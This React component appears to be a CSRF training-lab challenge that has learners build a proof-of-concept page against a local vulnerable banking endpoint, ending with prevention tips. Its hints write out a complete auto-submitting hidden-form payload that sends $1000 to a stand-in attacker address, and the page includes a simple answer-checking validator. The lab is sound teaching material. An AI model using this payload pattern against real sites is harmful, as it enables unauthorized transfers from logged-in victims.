import { useState } from "react";
import { GoShieldCheck } from "react-icons/go";
import { IoShieldOutline } from "react-icons/io5";
import "./styles.scss";

export default function CSRFMoneyTransfer() {
  const [recipient, setRecipient] = useState("");
  const [amount, setAmount] = useState("");
  const [result, setResult] = useState(null);
  const [attempts, setAttempts] = useState(0);
  const [completed, setCompleted] = useState(false);
  const [showHint, setShowHint] = useState(false);
  const [pocCode, setPocCode] = useState("");
  const [loading, setLoading] = useState(false);

  const TARGET_RECIPIENT = "attacker@evil.com";
  const TARGET_AMOUNT = "1000";

  const hints = [
    "The transfer endpoint is POST /api/csrf/transfer with parameters: recipient and amount",
    "Create an HTML file with a <form> tag that targets the vulnerable endpoint",
    "Use hidden input fields: <input type='hidden' name='recipient' value='attacker@evil.com'>",
    "Add auto-submit JavaScript to make the attack seamless: <script>document.forms[0].submit();</script>",
    "The victim's browser will automatically include their session cookies with the request!",
    "Full PoC structure: <form method='POST' action='http://localhost:8000/api/csrf/transfer'><input type='hidden' name='recipient' value='attacker@evil.com'><input type='hidden' name='amount' value='1000'></form><script>document.forms[0].submit();</script>",
  ];

  const [currentHint, setCurrentHint] = useState(0);

  const handleTransfer = async () => {
    setAttempts((prev) => prev + 1);
    setLoading(true);

    try {
      const response = await fetch("http://localhost:8000/api/csrf/transfer", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ recipient, amount }),
      });

      const data = await response.json();
      setResult(data);

      if (data.success && recipient === TARGET_RECIPIENT && amount === TARGET_AMOUNT) {
        setResult({
          ...data,
          message: "Transfer successful! Now create a PoC that does this automatically."
        });
      }
    } catch (err) {
      setResult({
        success: false,
        message: "Network error - is backend running on port 8000?",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleTestPoC = () => {
    const hasForm = pocCode.includes("<form");
    const hasMethod = pocCode.toLowerCase().includes("post");
    const hasAction = pocCode.includes("/api/csrf/transfer");
    const hasRecipient = pocCode.includes(TARGET_RECIPIENT);
    const hasAmount = pocCode.includes(TARGET_AMOUNT);
    const hasAutoSubmit = pocCode.includes("submit()");

    if (hasForm && hasMethod && hasAction && hasRecipient && hasAmount && hasAutoSubmit) {
      setCompleted(true);
      setResult({
        success: true,
        message: "Perfect! Your CSRF PoC is correct and would work!",
        type: "poc-success",
        details: {
          scenario: "When a victim visits your malicious page while logged into the bank",
          impact: `$${TARGET_AMOUNT} would be transferred to ${TARGET_RECIPIENT}`,
          reason: "Browser automatically includes session cookies with cross-origin requests"
        }
      });
    } else {
      const missing = [];
      if (!hasForm) missing.push("form tag");
      if (!hasMethod) missing.push("POST method");
      if (!hasAction) missing.push("correct action URL");
      if (!hasRecipient) missing.push("recipient field");
      if (!hasAmount) missing.push("amount field");
      if (!hasAutoSubmit) missing.push("auto-submit script");

      setResult({
        success: false,
        message: `PoC is incomplete. Missing: ${missing.join(", ")}`,
        type: "poc-error"
      });
    }
  };

  const handleGoToNextTask = () => {
    window.location.href = "/csrf/tasks/task2";
  };

  return (
    <div className="csrf-task-container">
      <div className="csrf-task-content">
        <div className="header-container">
          <div className="header-content">
            <h1>CSRF Task 1: Money Transfer Attack</h1>
          </div>
        </div>

        <div className="task-description">
          <h3>Mission Objective:</h3>
          <p>
            You've discovered a vulnerable banking application that processes money 
            transfers without CSRF protection. Your goal is to create a malicious 
            HTML page that will automatically transfer <strong>$1000</strong> to{" "}
            <code>attacker@evil.com</code> when visited by an authenticated victim.
          </p>

          <div className="vulnerability-info">
            <h4>Intelligence Gathered:</h4>
            <ul>
              <li><strong>Endpoint:</strong> <code>POST http://localhost:8000/api/csrf/transfer</code></li>
              <li><strong>Parameters:</strong> <code>recipient</code> (email), <code>amount</code> (number)</li>
              <li><strong>Vulnerability:</strong> No CSRF token validation</li>
              <li><strong>Authentication:</strong> Session cookies (automatically sent by browser)</li>
              <li><strong>Protection Level:</strong> None - wide open!</li>
            </ul>
          </div>

          <div className="attack-scenario">
            <h4>Attack Scenario:</h4>
            <ol>
              <li>Victim is logged into their bank account</li>
              <li>Attacker sends victim a link to malicious page</li>
              <li>Victim clicks the link (page looks harmless)</li>
              <li>Hidden form automatically submits to bank</li>
              <li>Browser sends victim's cookies with the request</li>
              <li>Bank processes transfer as if victim authorized it</li>
              <li>Money transferred to attacker's account!</li>
            </ol>
          </div>
        </div>

        <div className="legitimate-form">
          <h3>Step 1: Test Legitimate Transfer</h3>
          <p>First, verify the endpoint works by testing a normal transfer:</p>
          
          <div className="form-inputs">
            <input
              type="text"
              placeholder="Recipient email (try: attacker@evil.com)"
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
              className="csrf-input"
            />
            <input
              type="number"
              placeholder="Amount (try: 1000)"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="csrf-input"
            />
            <button 
              onClick={handleTransfer} 
              className="transfer-btn"
              disabled={loading}
            >
              {loading ? "Processing..." : "Test Transfer"}
            </button>
          </div>

          {result && result.type !== "poc-success" && result.type !== "poc-error" && (
            <div className={`result-box ${result.success ? 'success' : 'error'}`}>
              <h4>{result.message}</h4>
              {result.details && (
                <div className="result-details">
                  <pre>{JSON.stringify(result.details, null, 2)}</pre>
                </div>
              )}
            </div>
          )}
        </div>

        <div className="poc-section">
          <h3>Step 2: Create Your CSRF Proof of Concept</h3>
          <p>
            Now that you know the endpoint works, create malicious HTML code that 
            would perform the attack automatically when a victim visits the page:
          </p>

          <div className="poc-template">
            <div className="template-hint">
              <strong>Template Structure:</strong> You need an HTML form that posts 
              to the target endpoint with hidden fields, and JavaScript to auto-submit it.
            </div>
          </div>

          <textarea
            className="poc-editor"
            placeholder={`Write your CSRF exploit HTML here...

Example structure:
<!DOCTYPE html>
<html>
<body>
  <h1>Click here for a free prize!</h1>
  <!-- Your malicious form here -->
</body>
</html>`}
            value={pocCode}
            onChange={(e) => setPocCode(e.target.value)}
            rows={16}
          />
          
          <button onClick={handleTestPoC} className="test-poc-btn">
            Validate PoC Code
          </button>

          {result && (result.type === "poc-success" || result.type === "poc-error") && (
            <div className={`result-box ${result.success ? 'success' : 'error'}`}>
              <h4>{result.message}</h4>
              {result.details && (
                <div className="result-details">
                  <p><strong>Scenario:</strong> {result.details.scenario}</p>
                  <p><strong>Impact:</strong> {result.details.impact}</p>
                  <p><strong>Why it works:</strong> {result.details.reason}</p>
                </div>
              )}
            </div>
          )}
        </div>

        <div className="hints-section">
          <button 
            onClick={() => setShowHint(!showHint)}
            className="hints-toggle"
          >
            {showHint ? "Hide Hints" : "Show Hints"}
          </button>
          
          {showHint && (
            <div className="hints-list">
              {hints.slice(0, currentHint + 1).map((hint, idx) => (
                <div key={idx} className="hint-item">
                  <span className="hint-number">Hint {idx + 1}:</span>
                  <span className="hint-text">{hint}</span>
                </div>
              ))}
              {currentHint < hints.length - 1 && (
                <button 
                  onClick={() => setCurrentHint(currentHint + 1)}
                  className="next-hint-btn"
                >
                  Next Hint
                </button>
              )}
            </div>
          )}
        </div>

        {completed && (
          <div className="completed-panel">
            <h2 className="completed-title">Challenge Completed!</h2>
            <p className="completed-subtitle">
              You successfully created a CSRF exploit that can steal money!
            </p>
            
            <div className="completed-card">
              <h3 className="completed-card-title">
                <div className="completed-card-header">
                  <IoShieldOutline /> What You Learned:
                </div>
              </h3>
              <ul className="completed-list">
                <li className="completed-list-item">
                  <GoShieldCheck />
                  CSRF exploits the browser's automatic cookie submission mechanism
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Hidden forms can execute state-changing actions without user knowledge
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Auto-submit JavaScript makes the attack completely transparent
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  CSRF tokens are essential for protecting against these attacks
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Any state-changing operation needs CSRF protection (POST/PUT/DELETE)
                </li>
              </ul>
            </div>

            <div className="defense-tips">
              <h4>How to Prevent This Attack:</h4>
              <ul>
                <li>Implement CSRF tokens (unique per session/request)</li>
                <li>Use SameSite cookie attribute (Strict or Lax)</li>
                <li>Validate Origin and Referer headers</li>
                <li>Require re-authentication for sensitive operations</li>
                <li>Use custom headers for AJAX requests</li>
              </ul>
            </div>

            <div className="button-container">
              <button className="next-task-btn" onClick={handleGoToNextTask}>
                Next Task: CSRF Token Bypass →
              </button>
            </div>
          </div>
        )}

        <div className="stats-footer">
          <div className="stat-item">
            <span className="stat-label">Attempts:</span>
            <span className="stat-value">{attempts}</span>
          </div>
          <div className="stat-item">
            <span className="stat-label">Hints Used:</span>
            <span className="stat-value">{currentHint + (showHint ? 1 : 0)}</span>
          </div>
        </div>
      </div>
    </div>
  );
}
